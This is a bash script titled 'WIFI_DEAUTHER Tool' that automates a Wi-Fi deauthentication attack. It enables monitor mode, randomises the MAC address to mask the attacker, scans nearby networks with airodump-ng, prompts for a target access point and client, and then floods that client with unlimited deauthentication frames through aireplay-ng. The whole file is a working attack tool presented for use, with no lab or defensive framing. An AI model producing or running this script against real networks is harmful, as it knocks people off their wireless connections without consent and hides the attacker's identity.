#!/bin/bash
# WIFI_DEAUTHER Tool

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi

# Function to clean up and exit
function cleanup {
    echo "Cleaning up..."
    airmon-ng stop wlan0mon > /dev/null 2>&1
    echo "Script ended."
    exit
}

trap cleanup EXIT

# Start monitor mode on the wireless interface
echo "Starting wlan0 in monitor mode..."
airmon-ng start wlan0 > /dev/null 2>&1
if [[ $? -ne 0 ]]; then
    echo "Failed to start monitor mode on wlan0. Exiting."
    exit 1
fi

echo "Interface wlan0mon is now in monitor mode."

# Change MAC address
echo "Changing MAC address..."
macchanger -r wlan0mon > /dev/null 2>&1
if [[ $? -ne 0 ]]; then
    echo "Failed to change MAC address. Exiting."
    exit 1
fi

echo "MAC address changed successfully."

# Bring up the interface
echo "Bringing up wlan0mon..."
ifconfig wlan0mon up > /dev/null 2>&1
if [[ $? -ne 0 ]]; then
    echo "Failed to bring up wlan0mon. Exiting."
    exit 1
fi

echo "Interface wlan0mon is now up."

# Capture information about nearby networks
fileName=$(date +%Y-%m-%d_%H-%M-%S).csv
echo "Capturing network information..."
airodump-ng wlan0mon --output-format csv -w $fileName > /dev/null 2>&1 &

sleep 5  # Wait for airodump-ng to capture some data
echo "Press Enter when ready to continue..."
read

# Select target network and device to deauthenticate
echo "Select the target network (BSSID):"
read nameAP
echo "Select the device to deauthenticate (Station MAC):"
read Device

# Perform deauthentication attack
echo "Performing deauthentication attack on $Device from $nameAP..."
aireplay-ng -0 0 -a $nameAP -c $Device wlan0mon

cleanup  # Clean up and exit
